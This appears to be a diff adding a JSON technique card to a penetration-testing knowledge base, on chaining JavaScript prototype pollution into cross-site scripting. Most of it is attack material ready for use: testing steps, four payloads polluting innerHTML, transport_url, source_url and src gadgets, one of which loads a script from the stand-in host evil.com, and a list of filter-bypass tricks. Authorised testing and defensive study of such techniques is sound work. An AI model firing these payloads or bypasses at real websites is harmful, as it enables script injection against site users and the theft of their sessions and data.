@@ -1,0 +1,61 @@
+{
+  "id": "client-prototype-pollution-xss",
+  "title": "Prototype Pollution to XSS Chain",
+  "category": "client_side",
+  "tags": ["prototype-pollution", "xss", "javascript", "dom", "client-side"],
+  "applicability": {
+    "technologies": ["node", "javascript", "react", "vue", "angular"],
+    "contexts": ["url-parameter", "json-body", "query-string"],
+    "preconditions": ["javascript-object-merge", "client-side-rendering"]
+  },
+  "technique": {
+    "summary": "Exploit JavaScript prototype pollution to inject properties into Object.prototype, then chain this with a gadget in a JS library or framework to achieve XSS. Prototype pollution occurs when user input is recursively merged into objects without proper sanitization.",
+    "steps": [
+      "Identify merge/extend/clone operations that process user input (URL params, JSON body)",
+      "Test for prototype pollution: inject __proto__.testPoll=polluted via URL or JSON",
+      "Verify: check if ({}).testPoll === 'polluted' in browser console",
+      "Identify XSS gadgets: properties that get used in innerHTML, document.write, eval, or src attributes",
+      "Common gadgets: innerHTML via data-* attributes, transport_url in analytics libs, source_url in error handlers",
+      "Craft a URL with the pollution payload that chains to an XSS gadget",
+      "Verify script execution in browser"
+    ],
+    "payloads": [
+      {
+        "payload": "https://target.com/?__proto__[innerHTML]=<img/src/onerror=alert(1)>",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Direct innerHTML gadget via URL parameter pollution"
+      },
+      {
+        "payload": "https://target.com/?__proto__.transport_url=data:,alert(1)//",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Exploit analytics library transport_url gadget"
+      },
+      {
+        "payload": "{\"__proto__\":{\"source_url\":\"javascript:alert(1)\"}}",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "JSON body prototype pollution with source_url gadget"
+      },
+      {
+        "payload": "https://target.com/?constructor[prototype][src]=//evil.com/xss.js",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Alternative syntax using constructor.prototype"
+      }
+    ],
+    "bypassTechniques": [
+      "Use constructor.prototype instead of __proto__ to bypass filters",
+      "URL-encode the __proto__ string: __%70roto__",
+      "Use JSON body if URL parameters are filtered",
+      "Try nested pollution: __proto__.__proto__ for deeper chains",
+      "Look for server-side prototype pollution in Node.js apps (can lead to RCE)"
+    ]
+  },
+  "references": [
+    "https://portswigger.net/web-security/prototype-pollution",
+    "https://portswigger.net/research/server-side-prototype-pollution"
+  ],
+  "source": "portswigger-research"
+}
